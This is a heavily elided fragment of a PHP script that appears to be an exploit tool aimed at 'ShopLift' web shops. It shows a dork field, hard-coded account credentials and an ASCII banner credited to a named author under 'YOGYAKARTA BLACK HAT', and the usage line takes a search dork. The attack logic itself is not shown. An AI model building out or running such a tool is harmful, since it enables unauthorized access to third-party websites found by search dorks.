...
class ShopLiftFathurFreakz {
	private $dork = "";
	private $username = "FathurFreakz";
	private $password = "w0w1998";
	...
	public function ExploitLogo(){
		...
		$logo .= "#------------------------------------------------#\n";
		$logo .= "#\t Author \t: FathurFreakz \t\t #\n";
		$logo .= "#\t Email \t\t: fathurfreakz@gmail.com #\n";
		$logo .= "#\t Thanks to \t: Nabiila Rizqi K \t #\n";
		$logo .= "#\t Usage \t\t: php ".basename($_SERVER["SCRIPT_FILENAME"], '.php').".php \"Dork\"\t #\n";
		$logo .= "#------------------------------------------------#\n";
		$logo .= "#\t (C) ".date("Y")." YOGYAKARTA BLACK HAT \t\t #\n";
		$logo .= "==================================================\n";
		echo $logo;
	}
}
